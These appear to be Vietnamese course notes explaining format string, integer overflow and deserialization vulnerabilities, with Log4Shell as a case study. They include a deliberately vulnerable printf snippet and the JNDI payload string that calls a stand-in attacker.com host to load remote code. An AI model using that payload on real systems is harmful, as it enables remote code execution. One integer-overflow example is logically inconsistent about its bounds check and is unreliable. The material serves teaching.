### 3. Một số lỗ hổng phần mềm khác

Ngoài tràn bộ đệm, còn có nhiều loại lỗ hổng phần mềm khác mà kẻ tấn công có thể khai thác để chiếm quyền điều khiển hệ thống.

#### 3.1. Lỗ hổng xâu định dạng (Format String Vulnerability)

Đây là một lỗ hổng nghiêm trọng, thường xuất hiện trong các hàm vào/ra của ngôn ngữ C như `printf`, `scanf`.

* **Khái niệm:** Lỗ hổng xảy ra khi lập trình viên sử dụng trực tiếp một chuỗi ký tự do người dùng cung cấp làm **xâu định dạng (format string)** cho hàm, thay vì truyền nó như một tham số thông thường.
* **Ví dụ về code có lỗ hổng:**
    ```c
    char buf[32];
    fgets(buf, sizeof(buf), stdin);
    printf(buf); // LỖ HỔNG!
    ```
    Cách viết đúng phải là: `printf("%s", buf);`.
* **Cơ chế khai thác:**
    * Khi hàm `printf` gặp các ký tự định dạng như `%d`, `%s`, `%x` trong xâu định dạng, nó sẽ mong đợi có các tham số tương ứng được đẩy vào stack.
    * Nếu lập trình viên viết `printf(buf)`, và trong `buf` do người dùng nhập vào có chứa các ký tự định dạng, `printf` sẽ đọc các giá trị ngay trên stack (vốn không phải là tham số của nó) và hiển thị ra.
* **Hậu quả:**
    * **Đọc dữ liệu nhạy cảm:** Bằng cách đưa vào các chuỗi như `"%x %x %x ..."` kẻ tấn công có thể làm lộ các giá trị trên stack, bao gồm biến cục bộ, địa chỉ trả về, và thậm chí cả giá trị "canary" dùng để chống tràn bộ đệm. 
    * **Ghi đè bộ nhớ:** Ký tự định dạng `%n` đặc biệt nguy hiểm. Nó không hiển thị giá trị mà **ghi số lượng ký tự đã được in ra cho đến thời điểm đó vào một địa chỉ bộ nhớ** được cung cấp làm tham số.  Kẻ tấn công có thể lợi dụng `%n` để ghi một giá trị bất kỳ vào một địa chỉ bất kỳ trên stack, ví dụ như ghi đè lên địa chỉ trả về (RIP). 

#### 3.2. Lỗ hổng tràn số nguyên (Integer Overflow)

* **Khái niệm:** Trong máy tính, các kiểu dữ liệu số nguyên (như `int`, `short`) có một dải biểu diễn hữu hạn. Tràn số nguyên xảy ra khi một phép toán số học tạo ra một kết quả nằm ngoài dải biểu diễn này, khiến giá trị bị "quay vòng". 
    * **Ví dụ (số nguyên có dấu 32-bit):** `0x7FFFFFFF` (số dương lớn nhất) `+ 1` sẽ trở thành `0x80000000` (số âm nhỏ nhất).
    * **Ví dụ (số nguyên không dấu 32-bit):** `0xFFFFFFFF` (số dương lớn nhất) `+ 1` sẽ trở thành `0`.
* **Hậu quả:** Việc không kiểm soát hiện tượng tràn số nguyên có thể dẫn đến các hành vi không mong muốn và thường là nguyên nhân gốc rễ của các lỗ hổng tràn bộ đệm. 
    * **Ví dụ 1:** Một chương trình nhận một giá trị độ dài `len` (kiểu `unsigned int`) từ người dùng và kiểm tra `if (len > 1024)`. Nếu kẻ tấn công gửi `len = -1`, giá trị này sẽ được hiểu là `0xFFFFFFFF` khi ép kiểu sang không dấu. Điều kiện kiểm tra `0xFFFFFFFF > 1024` sẽ đúng, nhưng khi giá trị `0xFFFFFFFF` này được truyền vào hàm `memcpy`, nó sẽ gây ra một vụ tràn bộ đệm cực lớn. 
    * **Ví dụ 2:** Một chương trình cấp phát bộ nhớ bằng lệnh `malloc(len * sizeof(int))`. Nếu `len` là một số rất lớn (ví dụ `0x40000001`), phép nhân `len * 4` có thể bị tràn và cho ra một kết quả rất nhỏ (ví dụ `0x00000004`). `malloc` sẽ cấp phát một vùng nhớ nhỏ hơn rất nhiều so với yêu cầu, dẫn đến tràn bộ đệm trên heap khi chương trình cố gắng ghi `len` phần tử vào đó. 

#### 3.3. Lỗ hổng Serialization

* **Serialization:** Là cơ chế cho phép chuyển một đối tượng trong bộ nhớ thành một luồng byte để có thể lưu trữ hoặc truyền qua mạng. **Deserialization** là quá trình ngược lại. 
* **Lỗ hổng:** Xảy ra khi một ứng dụng thực hiện deserialization trên một luồng byte không đáng tin cậy mà không có sự kiểm tra, xác thực chặt chẽ. 
* **Khai thác:** Kẻ tấn công có thể tạo ra một luồng byte độc hại. Khi được giải mã, nó sẽ tạo ra một đối tượng trong bộ nhớ của ứng dụng và có thể dẫn đến việc thực thi mã từ xa. 
* **Ví dụ nổi tiếng: Lỗ hổng Log4Shell (Log4j):**
    * Log4j là một thư viện ghi nhật ký (logging) cực kỳ phổ biến trong các ứng dụng Java. 
    * Nó có một tính năng cho phép phân tích cú pháp và thực thi các chuỗi đặc biệt trong nội dung nhật ký. 
    * Kẻ tấn công có thể lừa ứng dụng ghi một chuỗi nhật ký độc hại như `${jndi:ldap://attacker.com/pwnage}`. 
    * Khi Log4j xử lý chuỗi này, nó sẽ kết nối đến máy chủ của kẻ tấn công, tải về một đối tượng Java độc hại và thực hiện deserialization, dẫn đến việc thực thi mã từ xa. Đây là một trong những lỗ hổng nguy hiểm nhất trong thập kỷ qua.